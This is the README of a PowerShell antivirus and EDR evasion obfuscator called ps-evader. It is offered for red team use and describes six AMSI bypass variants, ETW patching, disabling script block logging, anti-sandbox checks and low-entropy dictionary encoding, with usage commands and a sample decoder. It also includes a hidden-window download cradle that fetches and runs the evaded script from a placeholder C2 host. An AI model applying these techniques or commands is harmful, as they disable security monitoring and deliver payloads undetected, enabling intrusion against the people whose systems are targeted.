# ps-evader

PowerShell AV/EDR evasion obfuscator for authorized red team engagements.

Takes a `.ps1` payload and applies multiple layered evasion techniques — AMSI bypass, ETW patching, script block logging disable, anti-sandbox checks, and payload encoding — producing an output `.ps1` that runs without triggering modern antivirus engines.

> **For authorized penetration testing and red team engagements only.**

---

## Features

| Layer | Techniques |
|---|---|
| AMSI bypass | 6 variants (reflection, P/Invoke patches, fuzzy type search, context corruption) |
| ETW bypass | `ntdll!EtwEventWrite` → nop — kills ETW telemetry for the process |
| Script block logging | Zeros `PSEtwLogProvider.m_enabled` — disables Event 4104 |
| Anti-sandbox | CPU count, uptime, RAM checks — silent exit in analysis VMs |
| Payload encoding | `deflate`, `xor`, `both`, `dict` (dictionary word substitution) |
| String obfuscation | All sensitive .NET class/method names charcode-encoded |
| Execution | Randomized across 3 PS execution methods per build |
| Double wrap | Optional second encoding layer |

---

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)

```bash
git clone https://github.com/nethunterxy/ps-evader
cd ps-evader
python3 ps-evader.py --help
```

---

## Usage

```
python3 ps-evader.py -i <input.ps1> -o <output.ps1> [options]
```

### Basic examples

```bash
# Default: AMSI v5 (fuzzy) + deflate encoding
python3 ps-evader.py -i payload.ps1 -o evaded.ps1

# Dictionary encoding (English words, no base64, low entropy)
python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict

# Dictionary + custom wordlist (local or URL)
python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict \
    --wordlist /usr/share/wordlists/rockyou.txt

python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict \
    --wordlist https://www.mit.edu/~ecprice/wordlist.10000

# All layers: AMSI v6 + ETW + SBL + anti-sandbox + dict
python3 ps-evader.py -i payload.ps1 -o evaded.ps1 \
    --amsi 6 --etw --no-logging --sandbox --encode dict

# Maximum depth: double encoding + P/Invoke AMSI + ETW + enc-cmd output
python3 ps-evader.py -i payload.ps1 -o evaded.ps1 \
    --amsi 4 --etw --no-logging --encode both --double --enc-cmd
```

---

## Options

```
-i, --input       Input .ps1 file
-o, --output      Output .ps1 file

--amsi {1..6}     AMSI bypass variant (default: 5)
--no-amsi         Skip AMSI bypass entirely

--etw             Patch ntdll!EtwEventWrite → nop (kills ETW telemetry)
--no-logging      Disable PowerShell script block logging (Event 4104)
--sandbox         Add anti-sandbox checks (CPU / RAM / uptime)

--encode          Payload encoding: deflate | xor | both | dict (default: deflate)
--wordlist        Wordlist for --encode dict (file path or HTTP URL)
--double          Add a second outer encoding layer

--enc-cmd         Write powershell -enc <b64> launch command to _enc.txt
--seed            RNG seed for reproducible output (testing/comparison)
```

---

## AMSI bypass variants

| # | Technique | Detection resistance | Notes |
|---|---|---|---|
| 1 | `amsiInitFailed = true` via reflection | Low | Classic — widely signatured, charcode-obfuscated strings help |
| 2 | `amsiContext = IntPtr.Zero` via reflection | Low | Same detection path as v1 |
| 3 | `AmsiScanBuffer` memory patch (E_INVALIDARG) | Medium | P/Invoke + VirtualProtect on amsi.dll |
| 4 | `AmsiOpenSession` 3-byte patch (`xor rax,rax`) | High | Win11 24H2+ — patches session init, not scan buffer |
| **5** | Fuzzy `GetTypes()` wildcard search | **High** | **Default.** No direct `GetType("AmsiUtils")` call — avoids behavioral sig |
| 6 | `amsiContext` structure corruption via `Marshal.Copy` | High | No `SetValue($null,$true)` pattern — different behavioral path entirely |

**v5 detail:** Instead of `[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")` (high-signal exact lookup), enumerates all types with `GetTypes()` and filters by `Name -like "*AmsiUtils"`. All wildcard strings are charcode-encoded — no sensitive literal appears in the output.

**v6 detail:** Writes zeros to the `AMSI_CONTEXT` structure header via `Marshal.Copy`. `AmsiScanBuffer` validates the header magic before scanning — corrupting it causes the scan to return `AMSI_RESULT_NOT_DETECTED` via the error path. No `SetValue`, no VirtualProtect.

---

## Payload encoding modes

| Mode | How it works | PS decoder APIs | Entropy | Polymorphism |
|---|---|---|---|---|
| `deflate` | Raw DEFLATE + base64 | `DeflateStream`, `FromBase64String` | High | Low (stable b64 pattern) |
| `xor` | XOR key + base64 | `FromBase64String`, for-loop `-bxor` | High | Medium (key changes) |
| `both` | DEFLATE → XOR → base64 | Both above | High | Medium |
| `dict` | Byte → English word substitution | `Split`, hashtable lookup, `UTF8.GetString` | **Low** | **Full** |

### Why `dict` achieves better bypass rates

Static AV engines score **Shannon entropy** on payload strings. Base64-encoded compressed data has entropy ≈ 6.0 bits/byte — a near-certain heuristic trigger.

Dictionary encoding maps each byte value (0–255) to a unique English word. The payload becomes:

```
meet grab carry fetch grain mind life carry plus have none...
```

Entropy ≈ 3.5 bits/byte (natural language). No compression API, no base64 alphabet, no recognizable byte patterns — and the word→byte mapping changes completely on every run (random shuffle), making per-build signatures impossible.

The PS decoder uses only `string.Split()` + hashtable lookup + `UTF8.GetString` — no crypto, no compression library calls:

```powershell
$d = "meet grab carry fetch grain..."
$m = @{"meet"=12;"grab"=47;"carry"=239; ...}   # 256-entry mapping
$w = $d.Split([char]32)
$b = New-Object byte[] $w.Length
for($i=0;$i-lt$w.Length;$i++){$b[$i]=[byte]$m[$w[$i]]}
$s = [System.Text.Encoding]::UTF8.GetString($b)
&([scriptblock]::create($s))
```

**Wordlist:** 256 unique English words are embedded as fallback. Pass `--wordlist` to use a larger list (e.g., `rockyou.txt`, MIT 10k) for more varied output and longer words.

**Size tradeoff:** `dict` output is ~6–9× larger than `deflate`. For payloads > 20 KB, use a wordlist with short words or prefer `--encode both` if file size is constrained.

---

## Output structure

For a run with `--amsi 5 --etw --no-logging --sandbox --encode dict`, the output is:

```
[anti-sandbox checks]          ← exit if CPU/RAM/uptime below threshold
[AMSI bypass]                  ← try/catch, fuzzy GetTypes() + charcode wildcards
[ETW bypass]                   ← try/catch, EtwEventWrite → 0x33 0xC0 0xC3
[SBL bypass]                   ← try/catch, PSEtwLogProvider.m_enabled = 0
[encoded payload + decoder]    ← English words + split/lookup/exec
```

All variable names are randomized on each build. Execution method (scriptblock / `$ExecutionContext` / `[PowerShell]::Create()`) is also randomized.

---

## Combining with other tools

The output `.ps1` can be further processed:

```bash
# Wrap output in a -EncodedCommand launcher
python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --enc-cmd
powershell -nop -w hidden -enc <content of evaded_enc.txt>

# Use as input to Invoke-Obfuscation for a second obfuscation pass
Import-Module Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath evaded.ps1 -Command "TOKEN\ALL\1" -Quiet

# Run via download-cradle (no disk write)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://C2/evaded.ps1')"
```

---

## Disclaimer

This tool is intended for use in **authorized penetration testing and red team engagements only**. Use against systems without explicit written authorization is illegal. The authors take no responsibility for misuse.
